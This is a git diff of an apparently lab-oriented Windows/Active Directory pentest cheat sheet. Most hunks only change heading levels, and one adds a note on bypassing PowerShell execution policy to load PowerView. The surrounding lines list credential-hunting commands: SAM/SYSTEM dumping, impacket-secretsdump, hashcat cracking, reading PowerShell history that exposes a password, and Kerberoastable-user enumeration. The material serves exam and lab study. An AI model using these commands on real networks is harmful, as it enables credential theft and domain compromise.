@@ -3767,12 +3767,12 @@ INFO: Querying computer: hutchdc.hutch.offsec
 INFO: Done in 00M 12S
 
 ````
-##### Network commands
+#### Network commands
 ````
 arp -a #look for IPs that your victim is connected
 ipconfig #look for a dual victim machine, typically two $IPs shown
 ````
-##### User Hunting
+#### User Hunting
 ````
 net users #Local users
 net users /domain #All users on Domain
@@ -3780,8 +3780,8 @@ net users jeff /domain #Queury for more infromation on each user
 net group /domain #Enumerate all groups on the domain
 net group "Music Department" / domain #Enumerating specific domain group for members
 ````
-##### Credential hunting
-###### Interesting Files
+#### Credential hunting
+##### Interesting Files
 ````
 Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
 Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
@@ -3790,7 +3790,7 @@ Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.doc
 ````
 tree /f C:\Users\ #look for interesting files, backups etc.
 ````
-###### Sam, System, Security Files
+##### Sam, System, Security Files
 ````
 whoami /all #BUILTIN\Administrators
 ````
@@ -3811,7 +3811,7 @@ c:\system z:\loot
 https://crackstation.net/
 hashcat -m <load the hash mode> hash.txt /usr/share/wordlists/rockyou.txt
 ````
-###### impacket-secretsdump
+##### impacket-secretsdump
 ````
 impacket-secretsdump Administrator:'password'@$IP -outputfile hashes
 ````
@@ -3833,7 +3833,7 @@ hashcat -m 2100 hashes.txt /usr/share/wordlists/rockyou.txt
 
 This hash does not allow pass-the-hash style attacks, and instead requires Password Cracking to recover the plaintext password
 ````
-###### Powershell
+##### Powershell
 ````
 PS C:\> (Get-PSReadlineOption).HistorySavePath
 C:\Users\adrian\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
@@ -3841,7 +3841,7 @@ C:\Users\adrian\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleH
 type C:\Users\adrian\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 echo "Let's check if this script works running as damon and password i6yuT6tym@"
 ````
-###### PowerView
+##### PowerView
 ````
 wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
 ````
@@ -3859,6 +3859,22 @@ Get-NetUser -SPN #Kerberoastable users
 Get-NetUser -SPN | select serviceprincipalname #Kerberoastable users
 Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'} #Domain admins kerberostable
 Find-LocalAdminAccess #Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.
+````
+###### Errors
+````
+PS C:\> Import-Module .\PowerView.ps1
+Import-Module : File C:\PowerView.ps1 cannot be loaded because running scripts is disabled on this system. For more 
+information, see about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170.
+````
+````
+PS C:\> powershell -exec bypass #this is how to get around it
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Try the new cross-platform PowerShell https://aka.ms/pscore6
+
+Import-Module .\PowerView.ps1
+PS C:\> Import-Module .\PowerView.ps1
 ````
 ##### mimikatz.exe
 ````
